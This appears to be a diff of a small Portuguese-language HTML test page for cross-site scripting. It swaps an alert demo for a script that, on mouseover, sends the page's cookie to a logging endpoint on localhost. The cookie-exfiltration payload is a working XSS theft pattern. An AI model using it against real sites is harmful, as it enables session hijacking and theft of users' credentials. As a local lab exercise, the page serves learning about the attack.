@@ -1,15 +1,23 @@
 <!DOCTYPE html>
-<html lang="pt">
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Site Vulnerável</title>
+  <title>Teste XSS</title>
+  <script>
+    function sendCookieToServer() {
+      // Cria o cookie
+      document.cookie = "user=teste; path=/";
+      
+      // Cria um objeto XMLHttpRequest para enviar o cookie via GET
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "http://localhost:5000/log_cookie?cookie=" + encodeURIComponent(document.cookie), true);
+      xhr.send();
+    }
+  </script>
 </head>
 <body>
-    <h1>Passe o mouse aqui!</h1>
-    
-    <div onmouseover="alert('XSS Executado!')"
-         style="width: 100%; height: 200px; background: red; text-align: center; line-height: 200px; font-size: 24px; color: white;">
-        Passe o mouse!
-    </div>
+  <h1 onmouseover="sendCookieToServer()">
+    Passe o mouse aqui para modificar e enviar o cookie
+  </h1>
 </body>
 </html>
